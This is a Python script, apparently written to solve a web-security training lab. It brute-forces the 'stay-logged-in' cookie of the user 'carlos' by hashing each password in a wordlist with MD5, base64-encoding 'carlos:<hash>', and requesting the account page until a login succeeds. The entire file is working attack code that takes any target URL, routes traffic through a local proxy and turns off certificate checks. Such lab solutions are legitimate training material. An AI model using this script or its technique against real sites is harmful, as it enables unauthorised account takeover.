import requests
import urllib3
import sys
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def access_carlos_account(s,url):
    print("#######Accessing into the carlos account#############")
    
    with open('lab_10_password.txt','r') as file:
        # password lai file ma kholya
        password=file.readlines()
        for passwords in password:
            #print(passwords.strip())
            #what I need here is: send a get request hai 
            md5_password='carlos:'+hashlib.md5(passwords.strip().encode("utf-8")).hexdigest()
            base64_password=base64.b64encode(bytes(md5_password,"utf-8"))
            str_passwd=base64_password.decode("utf-8")
            print(str_passwd.rstrip('='))
            my_account=url + '/my-account?id=carlos'
            cookies={'stay-logged-in':str_passwd}
            # send a get request
            r=requests.get(my_account,cookies=cookies,proxies=proxies,verify=False)
            if "Log out" in r.text:
                print("Successfully loggged into carlos account")
                sys.exit(0)
            else:
                print("Failed to logged in into carlos account")
        print("[-]All passwords tried no valid passwords found")        
                         
            
        



def main():
    if len(sys.argv)!=2:
        print("Usage %s <url>" % sys.argv[0])
        print("Example %s www.example.com" % sys.argv[0])
    else:
        s=requests.Session()
        url=sys.argv[1]
        access_carlos_account(s,url)    


if __name__=="__main__":
    main()